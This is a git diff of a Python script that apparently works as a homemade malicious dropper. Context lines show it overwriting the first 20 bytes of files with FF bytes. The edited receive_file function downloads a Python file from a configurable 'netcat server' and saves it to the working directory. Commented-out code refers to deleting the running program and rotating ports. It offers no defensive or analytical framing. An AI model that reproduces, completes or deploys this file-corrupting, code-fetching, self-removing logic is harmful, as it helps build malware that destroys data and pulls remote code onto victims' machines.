@@ -35,15 +35,17 @@ def read_first_20_bytes():
             print(f"Replaced the first 20 bytes of {filename} with FF FF FF FF ...")
 
 def receive_file(connection, port):
-    file_name = f"file_from_server_variant_{port}.py"
-    print("FILENAME:", file_name)
-    with open(file_name, "wb") as file:
+    current_directory = os.getcwd()
+    file_name = f"\\file_from_server_variant_{port}.py"
+    current_directory+=file_name
+    # print("FILENAME:", file_name)
+    with open(current_directory, "wb") as file:
         while True:
             data = connection.recv(4096)
             if not data:
                 break
             file.write(data)
-    print(f"Received file from server on port {port} and saved as '{file_name}'")
+    print(f"Received file from server on port {port} and saved as '{current_directory}'")
    
     # Delete the current Python program
     # try:
@@ -72,9 +74,7 @@ def receive_file(connection, port):
 #     finally:
 #         client.close()
 
-# def get_last_4_chars(filename):
-#     # Extract the last 4 characters from the filename
-#     return filename[-7:-3]
+
 
 def connect_to_server(port):
     server_ip = "127.0.0.1"  # Replace this with the IP address of your netcat server
@@ -82,20 +82,6 @@ def connect_to_server(port):
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     try:
-        # while True:
-            # Get the last 4 characters of the current script's filename
-            # current_filename = __file__
-            # print(current_filename)
-            # # last_4_chars = get_last_4_chars(current_filename)
-            
-            # if int(last_4_chars) != port:
-            #     break
-            # else:
-        # port =(current_time % 6)* 1025
-        # if port==0:
-        #     port=1025 
-
-        # print(f"before connection {port}")
 
         while True:
             try:
@@ -118,8 +104,6 @@ def connect_to_server(port):
         print(f"No server exists at port {port}")
     finally:
         client.close()
-
-
 
 
 # Example usage
